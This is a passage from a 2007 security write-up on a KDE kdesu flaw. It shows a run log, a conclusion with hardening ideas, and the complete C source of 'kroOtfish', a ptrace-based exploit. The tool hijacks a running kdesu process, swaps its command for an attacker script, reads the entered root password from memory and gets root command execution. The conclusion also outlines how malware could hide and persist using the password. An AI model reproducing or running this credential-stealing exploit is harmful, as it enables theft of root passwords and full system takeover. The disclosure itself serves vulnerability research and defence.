0xf001@debian:~/_0xf001/_dev/_retools/kroOtfish/tests$ kdesu "/bin/ls > /tmp/x"

        looking for kdesu ... found
        found kdesu: pid 8934, wants to execute '/bin/ls > /tmp/x'
        found 'SuProcess::checkInstall' @ 0804d0bc
        found '__bss_start' @ 080539a8
attaching to process
waiting for process ...
        stopped by signal 19
injecting very evil command ...
replacing '/bin/ls > /tmp/x' by '/tmp/y' from 080539a8 to 0xffffffff

        searching '/bin/ls > /tmp/x'
                        read_p(pid: 8934, va: 0805d4a0, buf: bf9de1a0, len: 15)
                        read_p(pid: 8934, va: 0805d4a4, buf: bf9de1a4, len: 15)
                        read_p(pid: 8934, va: 0805d4a8, buf: bf9de1a8, len: 15)
                        read_p(pid: 8934, va: 0805d4ac, buf: bf9de1ac, len: 15)
        found @ 0805d4a0: '/bin/ls > /tmp/x\'
        replacing 6 bytes with '/tmp/y'
                        write_p(pid: 8934, va: 0805d4a0, buf: 08049d68, len: 6)
                                write_p: filled word with: 706d742f
                                write_p: filled word with: 0900792f

                        read_p(pid: 8934, va: 0809dad8, buf: bf9de1a0, len: 15)
                        read_p(pid: 8934, va: 0809dadc, buf: bf9de1a4, len: 15)
                        read_p(pid: 8934, va: 0809dae0, buf: bf9de1a8, len: 15)
                        read_p(pid: 8934, va: 0809dae4, buf: bf9de1ac, len: 15)
        found @ 0809dad8: '/bin/ls > /tmp/x\'
        replacing 6 bytes with '/tmp/y'
                        write_p(pid: 8934, va: 0809dad8, buf: 08049d68, len: 6)
                                write_p: filled word with: 706d742f
                                write_p: filled word with: 0900792f
        setting breakpoint @ 0804d0bc
                reading original instruction bytes ...
                        read_p(pid: 8934, va: 0804d0bc, buf: bf9de9a8, len: 4)
                original instruction bytes: 350c25ff
                modifying to: 350c25cc
                writing breakpoint ...
                        write_p(pid: 8934, va: 0804d0bc, buf: bf9de9a8, len: 4)
                                write_p: filled word with: 350c25cc
                breakpoin written!
continuing process ...
status after break:
        stopped by signal 5
BREAKPOINT HIT!!
stopped at EIP: 0804d0bc
fishing password: getting pointer
                        read_p(pid: 8934, va: bffdcd54, buf: bf9de9a0, len: 4)
password at: 080f25f0
now really fishing password
                        read_p(pid: 8934, va: 080f25f0, buf: 0804c008, len: 20)
                        read_p(pid: 8934, va: 080f25f4, buf: 0804c00c, len: 20)
                        read_p(pid: 8934, va: 080f25f8, buf: 0804c010, len: 20)
                        read_p(pid: 8934, va: 080f25fc, buf: 0804c014, len: 20)
                        read_p(pid: 8934, va: 080f2600, buf: 0804c018, len: 20)
creating very evil script
writing '#!/bin/bash
'
writing '/usr/bin/id > /tmp/fishlog
'
writing '/bin/ls > /tmp/x'
restoring original bytes
                        write_p(pid: 8934, va: 0804d0bc, buf: bf9de9a4, len: 4)
                                write_p: filled word with: 350c25ff
resetting eip and restoring registers
detaching ...

>>> root password: 'my_strongest_password' <<<
have a lot of fun!
                                                
$ ls -altr /tmp/

------x---  1 0xf001 0xf001   55 2007-04-29 19:28 y
-rw-r--r--  1 root  root    92 2007-04-29 19:28 x
-rw-r--r--  1 root  root    39 2007-04-29 19:28 fishlog

0xf001@debian:~/_0xf001/_dev/_retools/kroOtfish/tests$ cat /tmp/x
fork
fork.c
fork.c~
kdesu
kdesu.asm
kdesu.syms
libkdesu.so.4
libkdesu.so.4.asm
libkdeui.asm

!!!

0xf001@debian:~/_0xf001/_dev/_retools/kroOtfish/tests$ cat /tmp/fishlog
uid=0(root) gid=0(root) groups=0(root)

!!!


6 conclusion
==============

It is not only possible for an attacker to "fish" the root password out of a
running kdesu process, it is also possible to let it execute anything possible
in root context. By doing so it is clear that an attacker can control the whole
system.
A malware running under normal user privileges can background, hide itself from
showing up in the ps list[], wait for the root password, store it for later
retrieval, and inject itself into the system startup process. Quite simple would
be to inject itself to the login manager kdm, gdm, etc ... which is run in root
context at system startup. Also any kernel module could be infected, or an own
added to the running kernel.

Since the principle of the technique is so simple, I was wondering if nobody
has tried that before. I googled for kde related advisories and found [],
where a similar attack was closed in kde 2.x.

It is absolutely necessary to prevent the kdesu process from being able to be
attached to via the ptrace interface by an ordinary user.

I have verified the pendant of kdesu on gnome: gksu, is much better protected.
Also on OSX the password window can not be attched to via ptrace of an ordinary
user.


6.1 ideas and suggestions
==========================

The man page of kdesu writes the following about the intended unprivileged
nature of the kdesu process which was probably done to increase security.

... It is not a SUID root program, but runs unprivileged. The system program su
is used for  acquiring special privileges ...

The more unprivileged the kdesu process is, the more easy we can read and
manipulate its data. The fact that it is run in the context of our own user is
the worst in terms of security, but the best for us to execute our own command.

I think that whole concept has to be overthought. kdesu can not stay a process
of he current logged in desktop user. It has in some way to protect itself from
ptrace() based attacks.
This could allready be done by running it SUID of another unprivileged system
users id,



7 meet kroOtfish.c
===================

// kroOtfish.c, 2007 M. Schallner <ms@rocksolid.at>
// dont run this at home!

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>		
#include <sys/mman.h>
#include <sys/user.h>
#include <stdio.h>
#include <stdlib.h>
#include <err.h>
#include <elf.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>

char *my_evil_script  = "/tmp/y";
char *my_evil_command = "id > /tmp/fishlog\n";

void check_wait_status (int status)
{
	if (WIFEXITED(status)) {
		printf("\texited, status=%d\n", WEXITSTATUS(status));
	} else if (WIFSIGNALED(status)) {
		printf("\tkilled by signal %d\n", WTERMSIG(status));
	} else if (WIFSTOPPED(status)) {
		printf("\tstopped by signal %d\n", WSTOPSIG(status));
	} else if (WIFCONTINUED(status)) {
		printf("\tcontinued\n");
	}
}

void attach_p (int pid)
{
	int status = 0;

	printf("attaching to process\n");
	if ((ptrace(PTRACE_ATTACH, pid, NULL, NULL)) == -1) err(1,0);
	printf("waiting for process ...\n");
	waitpid(pid, &status, WUNTRACED | WCONTINUED);
	check_wait_status(status);	
}

int wait_4_int3 (int pid)
{
	int status = 0;

	// continue process, and wait for int 3 to happen
	printf("continuing process, waiting for int3 ...\n");

	if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1) err(1,0);
	waitpid(pid, &status, WCONTINUED);
	check_wait_status(status);
	if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) return 1;

	if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1) err(1,0);
	waitpid(pid, &status, WCONTINUED);
	check_wait_status(status);

	if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) return 1;
	else return 0;
}

void *read_p (int pid, unsigned long va, void *buf, int len)
{
	unsigned long *ptr = (unsigned long *) buf;
	int i = 0;

	while (i * 4 < len) { 
		printf("\t\t\tread_p(pid: %d, va: %08x, buf: %08x, len: %d)\n",
		pid, va + i * 4, &ptr[i], len);
		ptr[i] = ptrace(PTRACE_PEEKTEXT, pid, va + i * 4, NULL);
		i++;
	}
}

unsigned long write_p (int pid, unsigned long va, void *buf, int len)
{
	long word = 0;
	int i = 0;

	printf("\t\t\twrite_p(pid: %d, va: %08x, buf: %08x, len: %d)\n",
		pid, va, buf, len);

	while (i * 4 < len) {
		memcpy(&word, buf + i * 4, 4);
		printf("\t\t\t\twrite_p: filled word with: %08x\n", word);
		word = ptrace(PTRACE_POKETEXT, pid , va + i * 4, word);
		i++;
	}

	return word;
}

unsigned long find_str_p (int pid, unsigned long va, int len, char *needle)
{
	unsigned int word;
	int i = 0;

	int needle_strl = strlen(needle);
	int found=0; 

	while (i < len && !errno && found < needle_strl) { 
		word = ptrace(PTRACE_PEEKTEXT, pid, va + i, NULL);
		if( (unsigned char) word == needle[found]) { 
			found++;
		} else if(found) found=0;
		i++;
	}
	if( found == needle_strl) return va+i-found;
		
	return 0;
}

void detach_p (int pid)
{
	printf("detaching ...\n");
	if(ptrace(PTRACE_DETACH, pid , NULL , NULL) < 0) err(1,0);
}

unsigned long va2offset(unsigned long va, void *buf, int bufsize) 
{
	Elf32_Ehdr 	*ehdr;
	Elf32_Phdr 	*phdr; 
	int 		i;
	unsigned long	va_offs=0;

	ehdr = (Elf32_Ehdr *)buf;
	for (i = 0; i < ehdr->e_phnum; i++) {
                phdr =  (Elf32_Phdr *) ((char *)buf + ehdr->e_phoff + 
			(i * ehdr->e_phentsize));
                if (va >=  phdr->p_vaddr &&
                    va <= (phdr->p_vaddr + phdr->p_filesz)) {
                        va_offs = va - phdr->p_vaddr + phdr->p_offset;
                        return va_offs;		
                }
        }

	return 0;
}

unsigned long find_symbol(char *symbol_name, void *buf, unsigned int bufsize)
{
	Elf32_Ehdr *ehdr = (Elf32_Ehdr *)buf;
	Elf32_Phdr *ptbl = NULL, *phdr;
	Elf32_Dyn  *dtbl = NULL, *dyn;
 	Elf32_Rel  *rel_entry;
	Elf32_Sym  *symtab = NULL, *sym;
	char       *strtab = NULL, *str;
	unsigned int         i, j,str_sz, sym_ent=0, size;
	unsigned int *pltptr;
	unsigned int pltrel;	
 	char	   *pltgot, *jmprel;

	ptbl = (Elf32_Phdr *)((char *)buf + ehdr->e_phoff);
	for (i=0; i < ehdr->e_phnum; i++) {		
		phdr = &ptbl[i];
		if ( phdr->p_type == PT_DYNAMIC ) {
			/* dynamic linking info: imported routines */
			dtbl = (Elf32_Dyn *) ((char *)buf + phdr->p_offset);

			for ( j = 0; j < (phdr->p_filesz / 
					sizeof(Elf32_Dyn)); j++ ) {
				dyn = &dtbl[j];
				switch ( dyn->d_tag ) {
				case DT_STRTAB:
					strtab = (char *)
						dyn->d_un.d_ptr;
					break;
				case DT_STRSZ:
					str_sz = dyn->d_un.d_val;
					break;
				case DT_SYMTAB:
					symtab = (Elf32_Sym *)
						dyn->d_un.d_ptr;
					break;
				case DT_SYMENT:
					sym_ent = dyn->d_un.d_val;
					break;
				case DT_PLTGOT:
					pltgot = (char *)dyn->d_un.d_ptr;
					break;
				case DT_JMPREL:
					jmprel = (char *)dyn->d_un.d_ptr;
					break;
				}
			}	
		}
	}

	for ( i = 0; i < ehdr->e_phnum; i++ ) {
		phdr = &ptbl[i];

		if (phdr->p_type == PT_LOAD) {
		if (strtab >= (char *)phdr->p_vaddr && strtab < 
			(char *)phdr->p_vaddr + phdr->p_filesz) {
			strtab = (char *)buf + phdr->p_offset + 
				((int) strtab - phdr->p_vaddr);
		}
		if ((char *)symtab >= (char *)phdr->p_vaddr && (char *) symtab < 
					(char *)phdr->p_vaddr + 
					phdr->p_filesz) {
			symtab = (Elf32_Sym*)((char *)(buf) + phdr->p_offset + 
				(int) symtab - phdr->p_vaddr);
		}
		if ((char *)pltgot >= (char *)phdr->p_vaddr && (char *) pltgot < 
					(char *)phdr->p_vaddr + 
					phdr->p_filesz) {
			pltgot = (char *)buf + phdr->p_offset + 
				((unsigned int)pltgot - phdr->p_vaddr);
		}
		if ((char *)jmprel >= (char *)phdr->p_vaddr && (char *) jmprel < 
					(char *)phdr->p_vaddr + 
					phdr->p_filesz) {
			jmprel = (char *)buf + phdr->p_offset + 
				((unsigned int)jmprel - phdr->p_vaddr);
		}
		}
	}

	if ( ! symtab ) return 0;
	if ( ! strtab )	return 0;

	// chk glob syms
	if(sym_ent)
	for ( i = 1; i < size / sym_ent; i++ ) {
		sym = &symtab[i];
		str = &strtab[sym->st_name];
		if(sym->st_value && (strstr(str, symbol_name))) 
			return sym->st_value;
	}

	// check relocs
	if( pltgot && jmprel)
	for(pltptr = (unsigned int*)(pltgot + 12); *pltptr; pltptr++) {
		pltrel = *((unsigned int *)((char *)buf + 
			 va2offset(*pltptr, buf, bufsize) + 1));
		if(pltrel <  buf) {
			rel_entry = (Elf32_Rel *)((char *)jmprel + pltrel);	
			sym = &symtab[rel_entry->r_info >> 8];
			str = &strtab[sym->st_name];
			
  			if(strstr(str, symbol_name)) return *pltptr-6;
		}
 	}

	return 0;
}

int find_p(char *proc, char*proc_cmdline) {
	DIR *dir_proc;
        struct dirent *dir_ent;
	char filename[256];
	int fd;
	char procname[256];
	int pid = 0;
	char *s;

	printf("\tlooking for %s ... ", proc);

	if (!(dir_proc = opendir("/proc/")))err(1,0);

	while ((dir_ent = readdir(dir_proc)) && !pid) {
		if(dir_ent->d_name[0] >= '1' && dir_ent->d_name[0] <= '9') {
		// found a proc
			snprintf(filename, 255, "/proc/%s/cmdline", 
				 dir_ent->d_name);
			if ((fd = open(filename, O_RDONLY)) != -1) {
				procname[read(fd, procname, 255)] = 0; // terminator 
				// go behind kdesu
				s = procname; while(*s)s++; s++;
			
				snprintf(proc_cmdline, 1023, "%s", s);
				close(fd);
				// terminator ii: limit after "kdesu"
				procname[strlen(proc)] = 0; 
				if(strstr(procname, proc)) pid = atoi(dir_ent->d_name);
			}		
		} 
	}
	closedir(dir_proc);
	pid ? printf("found\n") : printf("not found\n");	

	return pid;
}

int main (int argc, char **argv) 
{
	int pid=0, fd;
	unsigned int file_size, insn_cc, insn_checkInstall;
	unsigned long va_checkInstall, va_bss_start, password_p, found_p;
	void *buf;
	char *password = "not found!";
	char proc_cmdline[1024]; // we read kdesu cmdline here
	char *script;
	char tmp[1024];
	struct stat tmpstat;
	struct user_regs_struct regs;

	printf("kroOtfish, 2007 Mario Schallner\n\n");

	// background
	printf("backgrounding ...\n");
	if(fork()) exit(1);	
	while (!(pid = find_p("kdesu", proc_cmdline))) sleep(3);

	printf("\tfound kdesu: pid %d, wants to execute '%s'\n", pid, proc_cmdline);

	if (strlen(proc_cmdline) < strlen(my_evil_script)) { 
		printf("kdesu command to small!\n"); exit(1); 
	}
	
	// open kdesu
	if ((fd = open("/usr/bin/kdesu", O_RDONLY) ) == -1) err(1, 0);
	fstat(fd, &tmpstat);
	file_size = tmpstat.st_size;
        buf = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if(buf == MAP_FAILED) err(1, 0);

	// locate SuProcess::checkInstall
	if(!(va_checkInstall = find_symbol("checkInstall", buf, file_size)))exit(3);;
	
	printf("\tfound 'SuProcess::checkInstall' @ %08x\n", va_checkInstall);	

	// locate __bss_start
	if(!(va_bss_start = find_symbol("__bss_start", buf, file_size))) exit(3);;
	printf("\tfound '__bss_start': %08x\n", va_bss_start);	

	munmap(buf, file_size);
	close(fd);

	attach_p(pid);
	
	// inject command
	printf("injecting very evil command ...\n");
	printf("replacing '%s' by '%s' from %08x to 0xffffffff\n", 
		proc_cmdline, my_evil_script, va_bss_start);

	printf("\n\nsearching '%s'\n");
	if( found_p = find_str_p(pid, va_bss_start, 500000, proc_cmdline)) {
		read_p (pid, found_p, tmp, strlen(proc_cmdline+1));
		printf("\tfound @ %08x: '%s'\n", found_p, tmp);
		printf("replacing %d bytes with '%s'\n", strlen(my_evil_script), 
			my_evil_script);
		write_p(pid, found_p, my_evil_script, strlen(my_evil_script));

		while( found_p = find_str_p(pid, found_p+4, 500000, proc_cmdline) ) {
			read_p (pid, found_p, tmp, strlen(proc_cmdline+1));
			printf("\tfound @ %08x: '%s'\n", found_p, tmp);
			printf("\treplacing %d bytes with '%s'\n", 
				strlen(my_evil_script), my_evil_script);
			write_p(pid, found_p, my_evil_script, strlen(my_evil_script));
		}
	}

	// set breakpoint
	printf("\tsetting breakpoint @ %08x\n", va_checkInstall);
	// get instruction
	printf("\t\treading original instruction bytes ...\n");
	read_p (pid, va_checkInstall, &insn_cc, 4);
	insn_checkInstall = insn_cc;

	printf("\t\toriginal instruction bytes: %08x\n", insn_checkInstall);

	// write int3
	insn_cc &= 0xffffff00;
	insn_cc ^= 0xcc; // opcode int3 

	printf("\t\tmodifying to: %08x\n", insn_cc);

	printf("\t\twriting breakpoint ...\n");
	write_p (pid, va_checkInstall, &insn_cc, 4);
	printf("\t\tbreakpoin written!\n");

	// detach_p(pid); exit(0);

	// wait for breakpoint		
	if (!wait_4_int3(pid)) { 
		printf("exiting without break\n"); 
		if ((ptrace(PTRACE_CONT, pid, NULL, NULL)) == -1) err(1,0);
		detach_p(pid); exit(2); 
	}

	printf("BREAKPOINT HIT!!\n");
	if ((ptrace(PTRACE_GETREGS, pid, NULL, &regs)) == -1) err(1,0);	
	regs.eip--; // reposition at int3 again
	printf("stopped at EIP: %08x\n", regs.eip);

	// fish password	
	printf("fishing password: getting pointer\n");
	read_p (pid, regs.esp+8, &password_p, 4);
	printf("password at: %08x\n", password_p);
	password = calloc(1, 1024);
	printf("now really fishing password\n");
	read_p (pid, password_p, password, 20);

	// lay egg
	// open sesame
	printf("creating very evil script\n");
        if ((fd = open(my_evil_script, O_RDWR|O_CREAT) ) == -1) err(1, 0);
	script = "#!/bin/bash\n";
	printf("writing '%s'\n", script);
	write(fd, script, strlen(script));
	script = my_evil_command;
	printf("writing '%s'\n", script);
	write(fd, script, strlen(script));
	script = proc_cmdline;
	printf("writing '%s'\n", script);
	write(fd, script, strlen(script));
	close(fd);

	// restore original instruction
	printf("restoring original bytes\n");
	write_p (pid, regs.eip, &insn_checkInstall, 4);
	// restore regs
	printf("resetting eip and restoring registers\n");
	if ((ptrace(PTRACE_SETREGS, pid, NULL, &regs)) == -1) err(1,0);

	// let proc continue
	detach_p(pid);	

	printf("\n>>> root password: '%s' <<<\nhave a lot of fun!\n", password);

	exit(0);
}

// EOF


8 references
=============

00 ...... "The short life and hard times of a Linux virus" - librenix
[ http://librenix.com?inode=21 ]

01 ...... "Linux vs Windows Viruses" - The Register
[ http://www.theregister.com/2003/10/6/linux_vs_windows_viruses/ ]
```
